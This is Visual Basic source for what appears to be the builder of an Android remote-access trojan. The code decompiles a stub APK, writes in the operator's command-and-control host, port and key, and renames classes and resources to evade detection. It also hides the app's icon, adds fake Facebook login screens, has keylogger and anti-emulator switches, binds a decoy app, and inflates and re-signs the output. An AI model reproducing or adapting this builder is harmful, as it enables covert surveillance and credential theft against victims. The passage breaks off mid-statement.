        '                            '  File.WriteAllBytes(folder_apktool & "\key.pk8", My.Resources.k)

        '                            CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar sign --key " & folder_apktool & "\key.pk8 --cert " & folder_apktool & "\certificate.pem --v2-signing-enabled true --v3-signing-enabled true --out " & folder_apktool & "\output\ready" & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk ")

        '                            ' CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar sign --ks " & target_key_path & " --ks-pass pass:" & target_key_pass & " --v1-signing-enabled=true --v2-signing-enabled=false --v3-signing-enabled=false --out " & folder_apktool & "\output\ready" & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & "zip" & ".apk ") ' توقيعك

        '                            FolderApk = True
        '                        End If
        '                        '  CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar " & folder_apktool & "\certificate.pem " & folder_apktool & "\key.pk8 " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk " & folder_apktool & "\output\ready" & ".apk") ' توقيعك


        '                        'Status_Text = "0/5"

        '                    End If
        'out:
        '                    If FolderApk = False Then

        '                        If b01.Data.ToString.StartsWith("I:") Then ' نجاح

        '                            Dim tmp As String = b01.Data.ToString

        '                            'Status_Text = tmp.Replace("I:", "")
        '                            LOG(tmp.Replace("I:", ""))

        '                            'ElseIf b01.Data.ToString.StartsWith("S:") Then ' نجاح

        '                            '    Dim tmp2 As String = b01.Data.ToString

        '                            '    'Status_Text = tmp.Replace("I:", "")
        '                            '    LOG(tmp2.Replace("S:", ""))

        '                            'ElseIf b01.Data.ToString.StartsWith("W:") Then ' نجاح

        '                            '    Dim tmp3 As String = b01.Data.ToString

        '                            '    'Status_Text = tmp.Replace("W:", "")
        '                            '    LOG(tmp3.Replace("I:", ""))
        '                            '    'S:تحذيرات 
        '                            '    'W:اخطاء
        '                            '    ' LOG(b01.Data.ToString)

        '                        End If

        '                    End If


        '                End If

        '            End If

        '        Catch ex As Exception
        '            ' MsgBox("error:0x77777777")
        '        End Try

        Try

            If Me.InvokeRequired Then

                Dim iInvoke As New Delegate0(AddressOf Sync_Output)

                Me.Invoke(iInvoke, New Object() {d01, b01})

                Exit Sub

            Else

                If Not String.IsNullOrEmpty(b01.Data) Then

                    Threading.Thread.Sleep(1)

                    If b01.Data.ToString.Contains("OpenJDK") Then ' OK

                        If Not Once Then
                            CMD.StandardInput.WriteLine("apktool d " & tempApk & ".apk")
                            Once = True
                        End If

                        '  b01.Data = ""
                        ' فك تغليف

                    ElseIf b01.Data.ToString.Contains("java -jar SignApk.jar") Or b01.Data.ToString.Contains("java -jar " & folder_apktool & "\SignApk.jar ") Then 'OK

                        'جاهز
                        Step3()

                    ElseIf b01.Data.ToString.Contains("Copying original files") Then 'OK

                        'انتظر حتى تنتهي من فك التغليف

                        Dim th1 As System.Threading.Thread = New Threading.Thread(AddressOf Step2)

                        th1.IsBackground = True

                        th1.Start()

                    ElseIf b01.Data.ToString.Contains("Built apk") Then 'OK


                        Try


                            If CheckFakeSize.Checked Then
                                If pumpfinished AndAlso pumpstarted Then
                                    GoTo holdver
                                End If

                                If firstpump Then
                                    GoTo skipthis
                                End If

                                firstpump = True
back10:
                                Dim b As String = folder_apktool & "\" & tempApk & "\build\apk\res\drawable-xxxhdpi\" & "freespace.png"
                                If IO.File.Exists(b) Then
                                    NewFakeSize = CInt(TextSize.Text)
waitpump:

                                    If Not pumpstarted Then
                                        If File.Exists(folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk") Then
                                            File.Delete(folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk")
                                        End If
                                        LOG("Resize Apk")
                                        pumpstarted = True
                                        Pumper(NewFakeSize * 1000)
                                        Threading.Thread.Sleep(5000)
                                        GoTo waitpump
                                    Else
                                        If pumpfinished Then
                                            GoTo continuework
                                        End If
                                        Threading.Thread.Sleep(5000)
                                        GoTo waitpump
                                    End If
continuework:

                                    CMD.StandardInput.WriteLine("apktool b " & tempApk)
                                    LOG("Rebuild apk")
                                    GoTo out
                                Else
                                    Threading.Thread.Sleep(_Time)
                                    GoTo back10
                                End If


                            End If

                        Catch ex As Exception
                            Threading.Thread.Sleep(_Time)
                            GoTo back10
                        End Try

skipthis:
holdver:
                        ' انتظر حتى يتم الانتهاء من تغليف الملف 
                        If Not File.Exists(folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk") Then
                            Threading.Thread.Sleep(5000)
                            LOG("Not Yet")
                            GoTo holdver
                        End If

                        If Not StartedZip Then

                            If Not StartedZip Then
                                CMD.StandardInput.WriteLine("zipalign.exe -v 4 " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & "zip" & ".apk ") ' توقيعك

                                LOG(" Verification...")
                                StartedZip = True
                            End If
                            Threading.Thread.Sleep(5000)
                            GoTo holdver
                        Else

                            LOG("Apk Signing...")

                            ''File.Delete(folder_apktool & "\certificate.pem")
                            '' File.Delete(folder_apktool & "\key.pk8")



                            'File.WriteAllBytes(folder_apktool & "\certificate.pem", My.Resources.c)
                            '  File.WriteAllBytes(folder_apktool & "\key.pk8", My.Resources.k)

                            CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar sign --key " & folder_apktool & "\key.pk8 --cert " & folder_apktool & "\certificate.pem --v2-signing-enabled true --v3-signing-enabled true --out " & folder_apktool & "\output\ready" & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk ")

                            ' CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar sign --ks " & target_key_path & " --ks-pass pass:" & target_key_pass & " --v1-signing-enabled=true --v2-signing-enabled=false --v3-signing-enabled=false --out " & folder_apktool & "\output\ready" & ".apk " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & "zip" & ".apk ") ' توقيعك

                            FolderApk = True
                        End If
                        '  CMD.StandardInput.WriteLine("java -jar " & folder_apktool & "\SignApk.jar " & folder_apktool & "\certificate.pem " & folder_apktool & "\key.pk8 " & folder_apktool & "\" & tempApk & "\dist\" & tempApk & ".apk " & folder_apktool & "\output\ready" & ".apk") ' توقيعك


                        'Status_Text = "0/5"

                    End If
out:
                    If FolderApk = False Then

                        If b01.Data.ToString.StartsWith("I:") Then ' نجاح

                            Dim tmp As String = b01.Data.ToString

                            'Status_Text = tmp.Replace("I:", "")
                            LOG(tmp.Replace("I:", ""))

                            'ElseIf b01.Data.ToString.StartsWith("S:") Then ' نجاح

                            '    Dim tmp2 As String = b01.Data.ToString

                            '    'Status_Text = tmp.Replace("I:", "")
                            '    LOG(tmp2.Replace("S:", ""))

                            'ElseIf b01.Data.ToString.StartsWith("W:") Then ' نجاح

                            '    Dim tmp3 As String = b01.Data.ToString

                            '    'Status_Text = tmp.Replace("W:", "")
                            '    LOG(tmp3.Replace("I:", ""))
                            '    'S:تحذيرات 
                            '    'W:اخطاء
                            '    ' LOG(b01.Data.ToString)

                        End If

                    End If


                End If

            End If

        Catch ex As Exception
            ' MsgBox("error:0x77777777")
        End Try




    End Sub



    Private Async Sub Step3()
        LOGEND(vbNewLine + "->" + "Finishing")
        While True
            LOGEND(".")
            Threading.Thread.Sleep(100)

            Dim ncPath As String = folder_apktool & "\output\ready" & ".apk"

            If System.IO.File.Exists(ncPath) Then


                vulTrack = 85

                'TODO : Fake Apk size



                Dim finish As System.DateTime = System.DateTime.Now()

                'Dim span As System.TimeSpan = finish - start

                'Dim sb As New Text.StringBuilder
                LOG("+----------- informations -----------+")
                LOG("name patch:" & namepatch)
                LOG("version:" & version)

                ' sb.AppendLine("+----------- informations -----------+")

                '  sb.AppendLine("idle time:" & " minutes " & span.Minutes & " seconds " & span.Seconds & " milliseconds " & span.Milliseconds)

                'sb.AppendLine("name patch:" & namepatch)

                'sb.AppendLine("version:" & version)


                If ports.Contains(":") Then

                    '  sb.AppendLine("DNS/ip:port")
                    LOG("DNS/ip:port")
                    Dim i As String() = ip.Split({":"}, StringSplitOptions.None)

                    Dim p As String() = ports.Split({":"}, StringSplitOptions.None)

                    For u As Integer = 0 To p.Length - 1

                        ' sb.AppendLine(i(u) & ":" & p(u))
                        LOG(i(u) & ":" & p(u))
                    Next

                Else

                    'sb.AppendLine("DNS/ip:" & ip)
                    LOG("DNS/ip:" & ip)
                    '  sb.AppendLine("port:" & ports)
                    LOG("port:" & ports)
                End If

                'sb.AppendLine("+-----------      end     -----------+")
Back0:

                Threading.Thread.Sleep(1)

                If IO.File.Exists(folder_apktool & "\output\info.inf") Then

                    IO.File.WriteAllText(folder_apktool & "\output\info.inf", "")

                Else
                    LOG("-------------------")
                    Dim fs As IO.FileStream = IO.File.Create(folder_apktool & "\output\info.inf")

                    fs.Close()

                    Threading.Thread.Sleep(1)

                    GoTo Back0

                End If

                vulTrack = 100

                Await Task.Factory.StartNew(Sub() OKY(), TaskCreationOptions.None)

                Builtapk = True

                Exit While

            End If

        End While

    End Sub

    Private Sub OKY()

        If FolderApk = True Then

            For i As Integer = 0 To 5
                Threading.Thread.Sleep(1000)
                ' Status_Text = CStr(i) & "/5"

            Next

            Process.Start(folder_apktool & "\output")

        End If

    End Sub

    Private Once As Boolean = False
    Private Sub Step2()



        While True
Back0:
            Threading.Thread.Sleep(_Time)

            Dim provider As String = folder_apktool & "\" & tempApk & "\res\xml\provider_paths.xml"

            Try
                Dim providerreder As String = IO.File.ReadAllText(provider)
                IO.File.WriteAllText(provider, providerreder.Replace("suffix", flavor).Replace(spymax, pack1).Replace(stub7, pack2))
            Catch ex As Exception

            End Try

            Dim p As String = folder_apktool & "\" & tempApk & "\res\values\strings.xml"
            Dim FaceBookPage As String = folder_apktool & "\" & tempApk & "\res\layout\flogin.xml"
            Dim FaceBookPage2 As String = folder_apktool & "\" & tempApk & "\res\layout-v22\flogin.xml"
            '    Dim googlePage As String = folder_apktool & "\" & tempApk & "\res\layout\glogin.xml"
            Try
                Dim fp As String = IO.File.ReadAllText(FaceBookPage)
                IO.File.WriteAllText(FaceBookPage, fp.Replace(resoString11, NresoString11))
            Catch ex As Exception

            End Try

            Try
                Dim fp2 As String = IO.File.ReadAllText(FaceBookPage2)
                IO.File.WriteAllText(FaceBookPage2, fp2.Replace(resoString11, NresoString11))
            Catch ex As Exception

            End Try

            Dim yml As String = folder_apktool & "\" & tempApk & "\apktool.yml"

            Dim AndroidManifest As String = folder_apktool & "\" & tempApk & "\AndroidManifest.xml"

            Dim public_xml As String = folder_apktool & "\" & tempApk & "\res\values\public.xml"

            Dim web_xml As String = folder_apktool & "\" & tempApk & "\res\layout\" & webXML & ".xml"

            Dim notifi_xml As String = folder_apktool & "\" & tempApk & "\res\layout\" & notifiXML & ".xml"



            If System.IO.File.Exists(p) Then

                vulTrack = 50

                Try
                    ' Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))
                    Dim readall As String = IO.File.ReadAllText(p) _
                    .Replace("[CYPHER_VICTIM]", namevictim) _
                    .Replace("[CYPHER_PATCH]", namepatch) _
                    .Replace("[CYPHER_VERSION]", version) _
                    .Replace("[CYPHER_PROPERTY]", proprty) _
                    .Replace("[CYPHER_SLEEP]", sleepms) _
                    .Replace("[CYPHER_BIND]", BIND_EX) _
                    .Replace("[CYPHER_INTENT]", intent_) _
                    .Replace("[CYPHER_PERMI]", PRIMS) _
                    .Replace(resoString0, NresoString0) _
                    .Replace(resoString1, NresoString1) _
                    .Replace(resoString2, NresoString2) _
                    .Replace(resoString3, NresoString3) _
                    .Replace(resoString4, NresoString4) _
                    .Replace(resoString5, NresoString5) _
                    .Replace(resoString6, NresoString6) _
                    .Replace(resoString7, NresoString7) _
                    .Replace(resoString8, NresoString8) _
                    .Replace(resoString9, NresoString9) _
                    .Replace(resoString10, NresoString10) _
                    .Replace(resoString11, NresoString11) _
                    .Replace(resoString12, NresoString12) _
                    .Replace(app_reso0, Napp_reso0) _
                    .Replace(draw_ico, Ndraw_ico) _
                    .Replace(draw_notifi, Ndraw_notifi) _
                    .Replace(webXML, NwebXML) _
                    .Replace(notifiXML, NnotifiXML)

                    IO.File.WriteAllText(p, readall)

                    vulTrack = 60
Back1:

                    Threading.Thread.Sleep(_Time)

                    If System.IO.File.Exists(yml) Then

                        Try
                            Dim readyml As String = IO.File.ReadAllText(yml).Replace("3.31.165", version).Replace("818", APKVERSION).Replace("331165", version.Replace(".", ""))
                            IO.File.WriteAllText(yml, readyml)
                        Catch ex As Exception
                            Threading.Thread.Sleep(_Time)

                            GoTo Back1
                        End Try
                        'If readyml.Contains("[SPY_MAX_NAME_VERSION]") Then

                        '    readyml = readyml.Replace("[SPY_MAX_NAME_VERSION]", version)

                        '    IO.File.WriteAllText(yml, readyml)

                        'End If

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back1

                    End If

                    vulTrack = 65
Back2:

                    Threading.Thread.Sleep(_Time)

                    If System.IO.File.Exists(AndroidManifest) Then


                        'If combotype.Text = "Hidden App" Then
                        '    Dim Readmanifistline = IO.File.ReadAllLines(AndroidManifest)

                        '    For Each lin In Readmanifistline
                        '        If lin.Contains("[HIDE_CODE]") Then
                        '            lin = My.Resources.SDK29
                        '            IO.File.WriteAllLines(AndroidManifest, Readmanifistline)
                        '        End If
                        '    Next

                        'End If


                        Dim readManifest As String = IO.File.ReadAllText(AndroidManifest).Replace(My.Resources.HIDECODE, My.Resources.SDK29)



                        If readManifest.Contains("suffix") Then


                            readManifest = readManifest _
                                 .Replace("suffix", flavor).Replace(spymax, pack1).Replace(stub7, pack2) _
                                 .Replace(ClassGen0, NClassGen0) _
                                 .Replace(My.Resources.HIDECODE, My.Resources.SDK29) _
                                 .Replace(ClassGen1, NClassGen1) _
                                 .Replace(ClassGen2, NClassGen2) _
                                 .Replace(ClassGen3, NClassGen3) _
                                 .Replace(ClassGen4, NClassGen4) _
                                 .Replace(ClassGen5, NClassGen5) _
                                 .Replace(ClassGen6, NClassGen6) _
                                 .Replace(ClassGen8, NClassGen8) _
                                 .Replace(ClassGen9, NClassGen9) _
                                 .Replace(ClassGen10, NClassGen10) _
                                 .Replace(ClassGen11, NClassGen11) _
                                 .Replace(ClassGen12, NClassGen12) _
                                 .Replace(ClassGen13, NClassGen13) _
                                 .Replace(ClassGen14, NClassGen14) _
                                 .Replace(_ask_battary_, N_ask_battary_) _
                                 .Replace(_ask_draw_, N_ask_draw_) _
                                 .Replace(_sc_fb_, N_sc_fb_) _
                                 .Replace(_news_g_, N_news_g_) _
                                 .Replace(_scctrl_, N_scctrl_) _
                                 .Replace(_access_ask_, N_access_ask_) _
                                 .Replace(_cap_sc_, N_cap_sc_) _
                                 .Replace(_trns_g_, N_trns_g_) _
                                 .Replace(_ask_prim_, N_ask_prim_) _
                                 .Replace(_engine_wrk_, N_engine_wrk_) _
                                 .Replace(_skin_cls_, N_skin_cls_) _
                                 .Replace(_update_app_, N_update_app_) _
                                 .Replace(_callr_lsnr_, N_callr_lsnr_) _
                                 .Replace(_srv_worker_, N_srv_worker_) _
                                 .Replace(resoString0, NresoString0) _
                                 .Replace(resoString1, NresoString1) _
                                 .Replace(resoString2, NresoString2) _
                                 .Replace(resoString3, NresoString3) _
                                 .Replace(resoString4, NresoString4) _
                                 .Replace(resoString5, NresoString5) _
                                 .Replace(resoString6, NresoString6) _
                                 .Replace(resoString7, NresoString7) _
                                 .Replace(resoString8, NresoString8) _
                                 .Replace(resoString9, NresoString9) _
                                 .Replace(resoString10, NresoString10) _
                                 .Replace(resoString11, NresoString11) _
                                 .Replace(resoString12, NresoString12) _
                                 .Replace(app_reso0, Napp_reso0) _
                                 .Replace(draw_ico, Ndraw_ico) _
                                 .Replace(draw_notifi, Ndraw_notifi) _
                                 .Replace(webXML, NwebXML) _
                                 .Replace("skin.name", FAKEAPPNAME) _
                                 .Replace("trg.trgtapp.trg", TheTarget) _
                                 .Replace("RANDOM_STR1", Randomunicode(100, 150)) _
                                 .Replace("RANDOM_STR2", Randomunicode(100, 150)) _
                                 .Replace("RANDOM_STR3", Randomunicode(100, 150)) _
                                 .Replace("_randomS", Randomunicode(150, 200)) _
                                 .Replace("_shit_", Randomunicode(150, 200)) _
                                 .Replace(My.Resources.HIDECODE, My.Resources.SDK29) _
                                 .Replace(notifiXML, NnotifiXML)


                            IO.File.WriteAllText(AndroidManifest, readManifest)

                        End If

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back2

                    End If

                    vulTrack = 70

Back3:
                    Dim pNotifi_2 As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_notifi & ".png"

                    If System.IO.File.Exists(pNotifi_2) Then

                        My.Computer.FileSystem.RenameFile(pNotifi_2, Ndraw_notifi & ".png")

                    Else

                        Threading.Thread.Sleep(_Time)

                        GoTo Back3

                    End If


                    If Not iconPatch = "null" Then

                        If System.IO.File.Exists(iconPatch) Then

Back4:
                            Threading.Thread.Sleep(_Time)

                            Dim picoPatch As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_ico & ".png"
                            Dim oldfakeicon As String = folder_apktool & "\" & tempApk & "\res\drawable\" & "skinicon" & ".png"

                            Try
                                If Not FAKEAPPicon = "null" Then
                                    If IO.File.Exists(oldfakeicon) Then
                                        IO.File.Delete(oldfakeicon)
                                        '' IO.File.Copy(FAKEAPPicon, oldfakeicon)
                                        fakeiconpic.Image.Save(oldfakeicon)
                                    Else
                                        fakeiconpic.Image.Save(oldfakeicon)
                                    End If
                                End If

                            Catch ex As Exception

                            End Try

                            If System.IO.File.Exists(picoPatch) Then

                                System.IO.File.Delete(picoPatch)

                                Dim imagicon = ResizeImage(Image.FromFile(iconPatch), New Size(144, 144))

                                ' System.IO.File.Copy(iconPatch, folder_apktool & "\" & tempApk & "\res\drawable\" & Ndraw_ico & ".png", True)
                                imagicon.Save(folder_apktool & "\" & tempApk & "\res\drawable\" & Ndraw_ico & ".png")
                            Else

                                Threading.Thread.Sleep(_Time)

                                GoTo Back4

                            End If

                        End If

                    Else

L1:
                        Dim picoPatch_2 As String = folder_apktool & "\" & tempApk & "\res\drawable\" & draw_ico & ".png"

                        If System.IO.File.Exists(picoPatch_2) Then

                            My.Computer.FileSystem.RenameFile(picoPatch_2, Ndraw_ico & ".png")

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo L1

                        End If

                    End If

                    If Not BIND_Path = "null" Then

                        If System.IO.File.Exists(BIND_Path) Then

Back5:
                            Threading.Thread.Sleep(_Time)

                            Dim b As String = folder_apktool & "\" & tempApk & "\res\raw\" & app_reso0

                            If System.IO.File.Exists(b) Then

                                System.IO.File.Delete(b)

                                System.IO.File.Copy(BIND_Path, folder_apktool & "\" & tempApk & "\res\raw\" & Napp_reso0, True)

                            Else

                                Threading.Thread.Sleep(_Time)

                                GoTo Back5

                            End If

                        End If

                    Else

L0:
                        Dim b As String = folder_apktool & "\" & tempApk & "\res\raw\" & app_reso0

                        If System.IO.File.Exists(b) Then

                            My.Computer.FileSystem.RenameFile(b, Napp_reso0)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo L0

                        End If

                    End If



Back6:
                    Try




                        Dim folder_smali As String = folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7

                        If IO.Directory.Exists(folder_smali) Then

                            Dim FileDirectory As New IO.DirectoryInfo(folder_smali)

                            Dim smi As IO.FileInfo() = FileDirectory.GetFiles("*.smali")

                            LOG("Encryption 1" + vbNewLine + "---------")
                            For Each di In smi

                                Dim smali As String = IO.File.ReadAllText(di.FullName)

                                If di.Name.ToLower = ("buildconfig.smali") Then
                                    smali = smali.Replace("payload", payload) _
                                    .Replace("suffix", flavor) _
                                    .Replace(spymax, pack1) _
                                    .Replace(stub7, pack2) _
                                    .Replace(resoString0, NresoString0) _
                                    .Replace(resoString1, NresoString1) _
                                    .Replace(resoString2, NresoString2) _
                                    .Replace(resoString3, NresoString3) _
                                    .Replace(resoString4, NresoString4) _
                                    .Replace(resoString5, NresoString5) _
                                    .Replace(resoString6, NresoString6) _
                                    .Replace(resoString7, NresoString7) _
                                    .Replace(resoString8, NresoString8) _
                                    .Replace(resoString9, NresoString9) _
                                    .Replace(resoString10, NresoString10) _
                                    .Replace(resoString11, NresoString11) _
                                    .Replace(resoString12, NresoString12) _
                                    .Replace(app_reso0, Napp_reso0) _
                                    .Replace(draw_ico, Ndraw_ico) _
                                    .Replace(draw_notifi, Ndraw_notifi) _
                                    .Replace(webXML, NwebXML) _
                                    .Replace(notifiXML, NnotifiXML)

                                Else


                                    'If di.Name.ToLower = "classgen11.smali" Then
                                    '    smali = smali.Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                                    '   .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                                    '   .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                                    '   .Replace("[CYPHER_VICTIM]", namevictim)

                                    'End If


                                    'If di.Name = "AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg$2.smali" Then
                                    '    smali = smali.Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                                    '            .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports)))
                                    'End If

                                    smali = smali.Replace(spymax, pack1).Replace(stub7, pack2) _
                                    .Replace(ClassGen0, NClassGen0) _
                                    .Replace(ClassGen1, NClassGen1) _
                                    .Replace(ClassGen2, NClassGen2) _
                                    .Replace(ClassGen3, NClassGen3) _
                                    .Replace(ClassGen4, NClassGen4) _
                                    .Replace(ClassGen5, NClassGen5) _
                                    .Replace(ClassGen6, NClassGen6) _
                                    .Replace(ClassGen8, NClassGen8) _
                                    .Replace(ClassGen9, NClassGen9) _
                                    .Replace(ClassGen10, NClassGen10) _
                                    .Replace(ClassGen11, NClassGen11) _
                                    .Replace(ClassGen12, NClassGen12) _
                                    .Replace(ClassGen13, NClassGen13) _
                                    .Replace(ClassGen14, NClassGen14) _
                                    .Replace(_ask_battary_, N_ask_battary_) _
                                    .Replace(_ask_draw_, N_ask_draw_) _
                                    .Replace(_sc_fb_, N_sc_fb_) _
                                    .Replace(_news_g_, N_news_g_) _
                                    .Replace(_scctrl_, N_scctrl_) _
                                    .Replace(_access_ask_, N_access_ask_) _
                                    .Replace(_cap_sc_, N_cap_sc_) _
                                    .Replace(_trns_g_, N_trns_g_) _
                                    .Replace(_ask_prim_, N_ask_prim_) _
                                    .Replace(_engine_wrk_, N_engine_wrk_) _
                                    .Replace(_skin_cls_, N_skin_cls_) _
                                    .Replace(_update_app_, N_update_app_) _
                                    .Replace(_callr_lsnr_, N_callr_lsnr_) _
                                    .Replace(_clss_loder_, N_clss_loder_) _
                                    .Replace(_excut_meth_, N_excut_meth_) _
                                    .Replace(_run_comnd_, N_run_comnd_) _
                                    .Replace(_get_me_fil_, N_get_me_fil_) _
                                    .Replace(_srv_worker_, N_srv_worker_) _
                                    .Replace(resoString0, NresoString0) _
                                    .Replace(resoString1, NresoString1) _
                                    .Replace(resoString2, NresoString2) _
                                    .Replace(resoString3, NresoString3) _
                                    .Replace(resoString4, NresoString4) _
                                    .Replace(resoString5, NresoString5) _
                                    .Replace(resoString6, NresoString6) _
                                    .Replace(resoString7, NresoString7) _
                                    .Replace(resoString8, NresoString8) _
                                    .Replace(resoString9, NresoString9) _
                                    .Replace(resoString10, NresoString10) _
                                    .Replace(resoString11, NresoString11) _
                                    .Replace(resoString12, NresoString12) _
                                    .Replace(app_reso0, Napp_reso0) _
                                    .Replace("suffix", flavor) _
                                    .Replace(draw_ico, Ndraw_ico) _
                                    .Replace(draw_notifi, Ndraw_notifi) _
                                    .Replace(webXML, NwebXML) _
                                    .Replace(notifiXML, NnotifiXML) _
                                    .Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                                    .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                                    .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                                    .Replace("[CYPHER_FUT0EX]", "==Acascvsrgbdsrthbsrhtrdtaefergs") _
                                    .Replace("[CYPHER_FUT1EX]", "==ACSDEWVareaergeafsv") _
                                    .Replace("[CYPHER_FUT2EX]", "==aadvsarsaerfaerAESVSEr") _
                                    .Replace("[CYPHER_VICTIM]", namevictim) _
                                    .Replace("[TYPE-HIDE]", THETYPE) _
                                    .Replace("skin.info", FAKEAPPlink) _
                                    .Replace("USE-SUPER", isuper) _
                                    .Replace("_isequel_mth_", "helpscanintnum") _
                                    .Replace("_exit_meth_", new_exit_mth) _
                                    .Replace("_wifipolc_meth_", new_wifipolc) _
                                    .Replace("_formtpakt_methd_", new_formatpacket) _
                                    .Replace("_DZIP_meth_", new_dzip) _
                                    .Replace("_Getbyte_meth_", new_getbyte) _
                                    .Replace("_D_BASE64_", new_base_mth) _
                                    .Replace("_getstr_meth_", new_getstr) _
                                    .Replace("_CZIP_meth_", new_czip) _
                                    .Replace("_inst_bnd_", new_inst) _
                                    .Replace("_strt_con_", new_strt_con_) _
                                    .Replace("[USE-REC]", UseRecorder) _
                                    .Replace("_fist_inf_", new_fist_inf_) _
                                    .Replace("_new_con_", new_new_con_) _
                                    .Replace("trg.trgtapp.trg", TheTarget) _
                                    .Replace("_send_it_", new_send_it_) _
                                    .Replace("_Reblace_", new_Reblace_) _
                                    .Replace("_runn_srv_", new_runn_srv_) _
                                    .Replace("[off_keylog]", OFFKEYLOG) _
                                    .Replace("[NO_EMUALTOR]", ANTIEMO) _
                                    .Replace("_NOTIFI_TITLE_", NOTIFI_TITLE) _
                                    .Replace("_NOTIFI_MSG_", NOTIFI_MSG) _
                                    .Replace("_randomS_shit_", Randomunicode(100, 200)) _
                                    .Replace("[RANDOM-STRING]", NEWRANDOM) _
                                    .Replace("[CYPHER_FUT3EX]", "aEVAERgaergaergasvargAA==")

                                End If

                                IO.File.WriteAllText(di.FullName, smali)

                            Next

                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali\" & spymax & "\" & stub7, pack2)

                            FileIO.FileSystem.RenameDirectory(folder_apktool & "\" & tempApk & "\smali\" & spymax, pack1)

                        Else

                            Threading.Thread.Sleep(_Time)

                            GoTo Back6

                        End If


                    Catch ex As Exception

                        Threading.Thread.Sleep(_Time)

                        GoTo Back6

                    End Try


                    'Back65:
                    '                    Try




                    '                        Dim folder_smali As String = folder_apktool & "\" & tempApk & "\smali_classes2\" & spymax & "\" & stub7

                    '                        If IO.Directory.Exists(folder_smali) Then

                    '                            Dim FileDirectory As New IO.DirectoryInfo(folder_smali)

                    '                            Dim smi As IO.FileInfo() = FileDirectory.ycoayfzNeuvVaavovdfoMyVuocnvyrvcziocxaaNuzoppMixyv("*.smali")

                    '                            LOG("Encryption 2" + vbNewLine + "---------")
                    '                            For Each di In smi

                    '                                Dim smali As String = IO.File.ReadAllText(di.FullName)

                    '                                If di.Name.ToLower = ("buildconfig.smali") Then
                    '                                    smali = smali.Replace("payload", payload) _
                    '                                    .Replace("suffix", flavor) _
                    '                                    .Replace(spymax, pack1) _
                    '                                    .Replace(stub7, pack2) _
                    '                                    .Replace(resoString0, NresoString0) _
                    '                                    .Replace(resoString1, NresoString1) _
                    '                                    .Replace(resoString2, NresoString2) _
                    '                                    .Replace(resoString3, NresoString3) _
                    '                                    .Replace(resoString4, NresoString4) _
                    '                                    .Replace(resoString5, NresoString5) _
                    '                                    .Replace(resoString6, NresoString6) _
                    '                                    .Replace(resoString7, NresoString7) _
                    '                                    .Replace(resoString8, NresoString8) _
                    '                                    .Replace(resoString9, NresoString9) _
                    '                                    .Replace(resoString10, NresoString10) _
                    '                                    .Replace(resoString11, NresoString11) _
                    '                                    .Replace(resoString12, NresoString12) _
                    '                                    .Replace(app_reso0, Napp_reso0) _
                    '                                    .Replace(draw_ico, Ndraw_ico) _
                    '                                    .Replace(draw_notifi, Ndraw_notifi) _
                    '                                    .Replace(webXML, NwebXML) _
                    '                                    .Replace(notifiXML, NnotifiXML)

                    '                                Else


                    '                                    'If di.Name.ToLower = "classgen11.smali" Then
                    '                                    '    smali = smali.Replace("key.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(KEY))) _
                    '                                    '   .Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    '   .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports))) _
                    '                                    '   .Replace("[CYPHER_VICTIM]", namevictim)

                    '                                    'End If


                    '                                    'If di.Name = "AbddSfsvasDFBstgrnsrtnatrhjrtghwrtgefsgfjdrTHAERgvergesrg$2.smali" Then
                    '                                    '    smali = smali.Replace("host.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ip))) _
                    '                                    '            .Replace("port.info", Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(ports)))
                    '                                    'End If

                    '                                    smali = smali.Replace(spymax, pack1).Replace(stub7, pack2) _
                    '                                    .Replace(ClassGen0, NClassGen0) _
                    '                                    .Replace(ClassGen1, NClassGen1) _
                    '                                    .Replace(ClassGen2, NClassGen2) _
                    '                                    .Replace(ClassGen3, NClassGen3) _
                    '                                    .Replace(ClassGen4, NClassGen4) _
                    '                                    .Replace(ClassGen5, NClassGen5) _
                    '                                    .Replace(ClassGen6, NClassGen6) _
                    '                                    .Replace(ClassGen8, NClassGen8) _
                    '                                    .Replace(ClassGen9, NClassGen9) _
                    '                                    .Replace(ClassGen10, NClassGen10) _
                    '                                    .Replace(ClassGen11, NClassGen11) _
